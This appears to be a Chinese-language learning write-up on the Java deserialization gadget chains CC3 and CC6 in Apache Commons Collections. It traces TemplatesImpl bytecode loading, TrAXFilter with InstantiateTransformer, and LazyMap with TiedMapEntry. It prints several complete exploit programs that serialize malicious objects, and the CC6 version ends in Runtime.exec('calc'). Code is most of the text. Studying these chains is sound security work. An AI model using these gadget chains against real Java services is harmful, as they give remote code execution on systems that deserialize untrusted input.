# CC3
## 目的

通过动态类加载，加载外部类，实现任意代码执行。

## 分析

### newTransformer任意代码执行

既然是要实现加载外部类，那肯定要使用动态类加载的机制，我们知道是类加载是在defineClass方法中完成的，所以跟进ClassLoader中找到defineCLass方法。

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758849282247-281434f1-c9e5-4069-a5e3-4f276be90346.png)

这里就是进行类加载的地方，从字节中获取类。但是这里是一个protected方法，不能直接调用，所以还是要去找其他重写的地方。

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758849733537-6f3470ae-2caf-4780-8206-a2ffeab308bb.png)

这里找到了一个default的definClass方法，所以这里有机会，他可能被同一个包下的其他方法调用。我们跟进去看看实现。刚好只有一处调用了。在`defineTransletClasses` 方法中。我们继续跟进去，看他是怎么实现的。

```java
private void defineTransletClasses()
        throws TransformerConfigurationException {

        if (_bytecodes == null) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
            throw new TransformerConfigurationException(err.toString());
        }

        TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                }
            });

        try {
            final int classCount = _bytecodes.length;
            _class = new Class[classCount];

            if (classCount > 1) {
                _auxClasses = new HashMap<>();
            }

            for (int i = 0; i < classCount; i++) {
                _class[i] = loader.defineClass(_bytecodes[i]);
                final Class superClass = _class[i].getSuperclass();

                // Check if this is the main class
                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                    _transletIndex = i;
                }
                else {
                    _auxClasses.put(_class[i].getName(), _class[i]);
                }
            }

            if (_transletIndex < 0) {
                ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
                throw new TransformerConfigurationException(err.toString());
            }
        }
        catch (ClassFormatError e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (LinkageError e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
```

这里的25行实现了defineClass，但是这个defineTransletClasses 方法还是一个私有方法，所以我们还要继续去找实现。

有三处实现了

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758850446686-d76b71eb-bcf0-4358-a9ce-828a07f8d7cb.png)

我们分别看一下，第一个和第二个都是返回加载的类，或是别的东西，我们还需要一个初始化类的过程才能实现代码执行。但是我们看第三个`getTransletInstance`

```java
private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;

            if (_class == null) defineTransletClasses();

            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
            translet.postInitialization();
            translet.setTemplates(this);
            translet.setServicesMechnism(_useServicesMechanism);
            translet.setAllowedProtocols(_accessExternalStylesheet);
            if (_auxClasses != null) {
                translet.setAuxiliaryClasses(_auxClasses);
            }

            return translet;
        }
        catch (InstantiationException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (IllegalAccessException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
```

他不只在第6行实现了`defineTransletClasses`方法加载了我们需要的类，

还在第10行调用了`newInstance`实现了类的初始化。这样我们就可以实现代码执行了。

但是由于它还是一个private的方法，所以我们还去查找一下实现，这里刚好只有一个地方调用了。就是`newTransformer`方法

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758870561297-07406654-2961-4782-9d2f-c1cac1c05ca4.png)

并且他刚好还是一个public的方法，所以这里就是我们最终的利用点了，我们只需要把需要得到参数传进去，并且调用`newTransformer`方法就会触发仍以代码执行。

### 利用链

`TemplatesImpl.newTransformer`->`getTransletInstance`->`defineTransletClasses`(动态加载类)+`newInstance`(初始化类并执行代码)

### 传入参数

接下来我们分析一下需要传入的参数

首先要触发`getTransletInstance`方法，跟进去看一下。（上面有）

- _name 这个参数为null时直接返回null，所以需要赋值。这里可以是任意字符串
- _class 这里为null会触发`defineTransletClasses`方法，我们正需要触发，所以不能赋值（可以Ctrl点击看看初始值为null）

然后还需要触发`defineTransletClasses`，也跟进去看看（上面有）

- _bytecodes 这里为null会触发异常，所以也不能为空。我们看看要赋值什么。注意到下面代码中有这个![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758871469780-f0d8841f-be92-4838-b53a-551eca4f6779.png)

这里是说会加载`_bytecodes`中的字节给`_class`因为在`getTransletInstance` 中执行的`newInstanc e`就是针对`_class`的，而跟进又发现`_bytecodes`是一个二维数组，所以我们只需要给`_bytecods`赋 值一个class对象并嵌套一个一维数组。(具体实现如下)

```
byte[] code= Files.readAllBytes(Paths.get("D://tem/classes/Test.class"));
        byte[][] codes={code};
        bytecodesFiled.set(templates,codes);
```

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758871719542-473da8b9-a9df-4bbc-a0d3-bcbc9de22749.png)

- _tfactory 后面对`_tfactory`执行了一个方法，所以这里也不能空。因为它是一个`TransformerFactoryImpl`类型，所以new就好了（注意到这里是一个transient方法，不能反序列化，但是在`readObject`中自动对它实现了赋值，所以不用管，我们这里只是为了演示在没有反序列化时的rce给他赋值，完整exp中可以把它注释掉）

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758872006700-6f691b16-151a-4237-917f-2a4a5140198e.png)

### 临时exp

```java
TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = TemplatesImpl.class;
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");

        Field bytecodesFiled = templatesClass.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);

        byte[] code= Files.readAllBytes(Paths.get("D://tem/classes/Test.class"));
        byte[][] codes={code};
        bytecodesFiled.set(templates,codes);


        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        templates.newTransformer() ;
```

这里就已经可以实现rce，只需要调用`templates`的`newTransformer`方法，可以利用cc1的任意命令执行实现rce了，下面就主要只写一下cc3本身的了。

### cc1+cc3

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javafx.scene.shape.Path;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;


public class CC3 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = TemplatesImpl.class;
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");

        Field bytecodesFiled = templatesClass.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);

        byte[] code= Files.readAllBytes(Paths.get("D://tem/classes/Test.class"));
        byte[][] codes={code};
        bytecodesFiled.set(templates,codes);


        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

//        templates.newTransformer() ;

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),

                new InvokerTransformer("newTransformer",null,null)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


        HashMap<Object,Object> map = new HashMap();
        map.put("value","value");
        Map<Object,Object>  transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor d = c.getDeclaredConstructor(Class.class, Map.class);
        d.setAccessible(true);
        Object o = d.newInstance(Target.class, transformedMap);
        serialize(o);
        unserialize("person.txt");



    }



    public static void serialize(Object obj) throws IOException, NoSuchFieldException, IllegalAccessException {
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("person.txt"));
        oos.writeObject(obj);
        System.out.println("序列化完成");
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        System.out.println("反序列化"+Filename +"完成");
        return obj;
    }


}
```

### 回到cc3本身

接上面临时exp，我们知道要调用`templates`的`newTransformer`方法，所以我们得去找还有哪里调用了`newTransformer`方法，因为我们最终要到`readObject`方法中去。

这里我们找到了 TrAXFilter类

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758873288700-02bbe718-e843-4462-b56e-67383f53686d.png)

为什么利用点是 TrAXFilter类 不是其他两个呢

- Process 这个在 main 里面，是作为一般对象用的，所以不用它
- 第二个 getOutProperties，是反射调用的方法，可能会在 fastjson 的漏洞里面被调用
- TransformerFactoryImpl 不能序列化，如果还想使用它也是也可能的，但是需要传参，我们需要去找构造函数。而它的构造函数难传参
- 至于TrAXFilter，虽然它也是不能序列化的，但是它的构造函数里有搞头

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758873306165-1b7675ee-e737-4d2d-aee3-ed554a0fd97e.png)

如果可以调用他的构造函数，那么就能调用`newTransformer`方法实现后续链。

但是它不能序列化，所以只能像`Runtime`一样从class下手。之前使用`InvokerTransformer`调用反射实现。

这里我们用的是`InstantiateTransformer`类的`transform`方法

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758873703517-59147c89-b23d-4200-8142-11a37f9619e5.png)

这里的`transform`就实现了对输入的`input`参数的，获取class，再实例化，这样来调用构造函数触发链子。

完美符合了我们的需求 我们可以通过 `InstantiateTransformer.transform()` 获取 TrAXFilter类构造器并初始化 实现 `templates.newTransformer()`

然后我们看一下其中的参数

- iParamTypes 构造函数的参数的类型的class对象。所以传`Templates.class`
- iArgs 要实例化的对象。我们也只有一个对象`templates`

这样我们就实现了调用`templates`的`newTransformer`方法。

下面可以改一下exp了。

### 临时exp（2）

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javafx.scene.shape.Path;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;


public class CC3 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = TemplatesImpl.class;
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");

        Field bytecodesFiled = templatesClass.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);

        byte[] code= Files.readAllBytes(Paths.get("D://tem/classes/Test.class"));
        byte[][] codes={code};
        bytecodesFiled.set(templates,codes);


        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

//        templates.newTransformer() ;

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

        instantiateTransformer.transform(TrAXFilter.class);
```

这里我们知道要调用`instantiateTransformer`.的`transform`，下面就是要掉transform方法了，用cc1或这cc6的都可以。我这里用的是cc1（注意改了一些参数）

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javafx.scene.shape.Path;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;


public class CC3 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = TemplatesImpl.class;
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");

        Field bytecodesFiled = templatesClass.getDeclaredField("_bytecodes");
        bytecodesFiled.setAccessible(true);

        byte[] code= Files.readAllBytes(Paths.get("D://tem/classes/Test.class"));
        byte[][] codes={code};
        bytecodesFiled.set(templates,codes);


        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

//        templates.newTransformer() ;

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

//        instantiateTransformer.transform(TrAXFilter.class);



        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(Runtime.class);

        HashMap<Object,Object> map = new HashMap();
        map.put("value","value");
        Map<Object,Object>  transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor d = c.getDeclaredConstructor(Class.class, Map.class);
        d.setAccessible(true);
        Object o = d.newInstance(Target.class, transformedMap);
        serialize(o);
        unserialize("person.txt");
    }



    public static void serialize(Object obj) throws IOException, NoSuchFieldException, IllegalAccessException {
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("person.txt"));
        oos.writeObject(obj);
        System.out.println("序列化完成");
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        System.out.println("反序列化"+Filename +"完成");
        return obj;
    }


}
```

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758875725896-0b8c6a47-3110-4949-afe0-f0989adec2ab.png)执行成功

# CC6

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758731581461-e1bedb18-2462-43d8-93f7-1122804ddee9.png)

## 完整exp：

```
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6Test {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> map = new HashMap();
        Map<Object,Object> lazymap = LazyMap.decorate(map,new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "aaa");

        HashMap<Object, Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry, "value");
        lazymap.remove("aaa");

        Field factoryField = LazyMap.class.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazymap, chainedTransformer);

//        serialize(map2);

        unserialize("person.txt");
    }


    public static void serialize(Object obj) throws IOException, NoSuchFieldException, IllegalAccessException {
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("person.txt"));
        oos.writeObject(obj);
        System.out.println("序列化完成");
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        System.out.println("反序列化"+Filename +"完成");
        return obj;
    }
}
```

整个流程后半部分和lazyMap链差不多，都是实现lazyMap类的get方法，来实现其中factory参数的transform方法（factory参数可控），然后factory是chainedtransformer，循环调用InvockerTransformer实现rce

### 前半部分

至于如何实现LazyMap的get方法，就和之前略有不同，因为jdk后来改了一些jdk自带的库，所以导致cc1用不了，这才有了万能的cc6。

### cc6中实现get

查找get的实现类，但是太多了我们就不找了，原作者找到了一个类`TiedMapEntry`类中的hashCode方法实现了get方法

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758680371786-4b219798-35d7-40d5-9554-bcd0918824b6.png)![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758680388788-3e02423a-7328-43d0-a002-b5c9de3139b8.png)

准确的说是hashCode实现了getValue，而getValue实现了map.get方法，而map参数是我们能控制的

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758680900075-54c1000e-8de9-43c1-a70a-30acf37393c0.png)

所以给map传一个LazyMap的对象即可

接下来就是如何调用hashCode方法，之前的URLDNS链中学到过，可以用hashMap中的readObject，里面会调用到hashMap。

## 问题一

此时这里会遇到和URLDNS中相同的问题，put会提前触发链子，因为put中也调用了hashCode方法

这里我们的解决办法是在之前前不完善链子，一开始不给LazyMap传入chainedTransformer，而是随便传一个，此时不会触发后面的链子，等put方法完成后我们在利用反射给LazyMap中的参数赋值为chaindeTransformer，触发后续链子。

### 实现：

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758681314816-bb19b36e-0dc2-4bd0-86f5-2020e772b4f6.png)

这里原本第一个LazyMap.decorate里面是赋值为chainedTransformer，这里改为别的，后续在反射赋值。

## 问题二

看上图，开始我们没有执行remove方法，这里是因为在实现LazyMap的get方法时有一个if判断

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758681664439-60b63f16-04d3-462a-b260-e9b411d1bb63.png)

是说在get时会判断key值是否为空，如果不为空就不会执行transformer，而我们要的是执行transformer，所以要让这个key为空。但是我们序列化之前就调用了put方法，虽然经过上一步操作没有让put提前执行完整的链子，但是他还是执行到了get方法里面，只是执行transform方法时不是执行的`chainedTransformer.transform`，所以执行get方法时就把key给put进去了，这个key就是我们上面给TiedMapEntry赋值的key`"aaa"`

### 解决：

因为是put之后导致的添加key，所以在put之后再把key移除就好了

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758684118025-0bae5955-e7cf-4bc2-9c10-e39b7c0cc365.png)这样就解决问题了

![](https://cdn.nlark.com/yuque/0/2025/png/51404470/1758684148678-1c2ee787-4f9b-4e16-92e6-9793acb2a680.png)
